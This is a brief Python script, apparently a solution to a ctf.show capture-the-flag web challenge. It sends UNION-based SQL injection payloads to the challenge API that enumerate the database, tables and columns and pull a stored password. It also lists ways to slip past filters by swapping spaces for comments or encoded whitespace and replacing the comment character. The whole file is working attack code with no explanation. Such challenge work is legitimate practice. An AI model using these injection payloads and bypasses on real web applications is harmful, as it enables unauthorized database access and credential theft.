import requests

url = "http://4accb7e6-317a-4f3a-a4a7-7386e87608aa.challenge.ctf.show/api"

result = ''

"""
payload = "id=' union select 1,2,3 #&page=1&limit=10"
payload = "id=' union select 1,2,(database()) #&page=1&limit=10"
payload = "id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web') #&page=2&limit=10"
payload = "id=' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user') #&page=2&limit=10"
payload = "id=' union select 1,2,(select password from ctfshow_web.ctfshow_user where username='flag') #&page=1&limit=10"
"""

payload = "id=' union select 1,2,(select password from ctfshow_web.ctfshow_user where username='flag') #&page=1&limit=10"


#绕过

"""空格绕过
payload = payload.replace(' ','/**/')
payload = payload.replace(' ','()') 
payload = payload.replace(' ','      ') 
payload = payload.replace(' ','%0a') 
payload = payload.replace(' ','%0b') 
payload = payload.replace(' ','%0c') 
"""
payload = payload.replace(' ','%0c')
#payload = payload.replace('=','like')
#payload = payload.replace('#','%23') ##号绕过
payload = payload.replace('#','--%0c')

print(payload)

response = requests.request("GET", url=url, params=payload)
print(response.text)